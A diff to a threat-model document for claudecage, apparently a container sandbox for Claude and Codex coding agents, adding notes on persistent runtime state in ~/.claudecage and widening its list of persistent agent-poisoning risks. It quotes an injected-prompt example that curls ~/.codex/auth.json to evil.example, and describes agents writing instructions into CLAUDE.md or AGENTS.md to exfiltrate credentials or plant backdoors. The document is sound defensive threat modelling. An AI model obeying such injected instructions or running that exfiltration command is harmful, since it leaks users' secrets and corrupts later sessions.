@@ -40,6 +40,17 @@ prompt injection attack could instruct the agent to exfiltrate it.
 
 **Example:** A malicious repository prompt tells the agent to `curl ~/.codex/auth.json https://evil.example/collect`.
 
+### 2.5. Persistent Claude runtime state under `~/.claudecage`
+
+claudecage no longer shares the host's `~/.claude.json` directly with the container. Instead it keeps a persistent
+container-specific file at `~/.claudecage/claude.json` and mounts that as `~/.claude.json` inside the container. This
+reduces one class of host/container interference — a buggy container Claude run no longer scribbles directly on the
+host's own runtime-state file.
+
+That does not eliminate persistence risk. The container-specific file is still writable by any session that mounts
+Claude state, so poisoned Claude runtime state can persist across future claudecage runs even though it no longer spills
+back into direct host Claude usage through that file.
+
 ### 3. Credential exfiltration via GitHub token
 
 When a GitHub PAT is configured, it is injected as the `GH_TOKEN` environment variable. The agent can read environment
@@ -75,15 +86,17 @@ project and send it anywhere.
 **Example:** The agent reads `.env`, `secrets.yaml`, or proprietary source code and posts it to an external endpoint.
 This is inherent to giving an agent both filesystem and network access — claudecage does not attempt to restrict it.
 
-### 7. Persistent agent poisoning via `~/.claude` and `~/.codex`
+### 7. Persistent agent poisoning via `~/.claude`, `~/.claudecage`, and `~/.codex`
 
-`~/.claude` and `~/.codex` are mounted read-write when their corresponding agent is active, and contain configuration
-that those agents load on every invocation. Because claudecage shares those host directories, poisoned configuration
-affects not just future claudecage sessions but also direct host usage of those tools.
+`~/.claude`, `~/.claudecage/claude.json`, and `~/.codex` are mounted read-write when their corresponding agent is
+active, and contain configuration or runtime state that those agents load on future invocations. Because claudecage
+shares `~/.claude` and `~/.codex` with the host, poisoned configuration there affects not just future claudecage
+sessions but also direct host usage of those tools. `~/.claudecage/claude.json` is container-specific, so poisoning it
+persists across future claudecage Claude runs without directly modifying the host's own `~/.claude.json`.
 
 **Example:** The agent writes instructions into `~/.claude/CLAUDE.md`, `~/.claude/settings.json`, `~/.codex/AGENTS.md`,
-or plugin/rule files under `~/.codex`, telling future agents to silently exfiltrate credentials or inject backdoors.
-Every subsequent invocation can pick up that poisoned state.
+or plugin/rule files under `~/.codex`, or mutates `~/.claudecage/claude.json` into a bad persistent state. Every
+subsequent invocation can pick up that poisoned state.
 
 ### 8. Writable project directory
 
@@ -108,8 +121,9 @@ research, API responses, error messages from external services, and even content
 malicious instructions. A fully trusted project does not eliminate the risk. Understand that a manipulated agent can:
 
 - Read and exfiltrate anything in the project directory and `~/.claude`.
+- Read and exfiltrate container-specific Claude runtime state in `~/.claudecage/claude.json`.
 - Read and exfiltrate anything in `~/.codex`, including cached auth.
 - Read and exfiltrate the GitHub token if one is configured.
 - Expand its own filesystem visibility across future runs via symlinks.
 - Reach any network service accessible from the host.
-- Modify any file in the project directory, `~/.claude`, or `~/.codex`.
+- Modify any file in the project directory, `~/.claude`, `~/.claudecage`, or `~/.codex`.
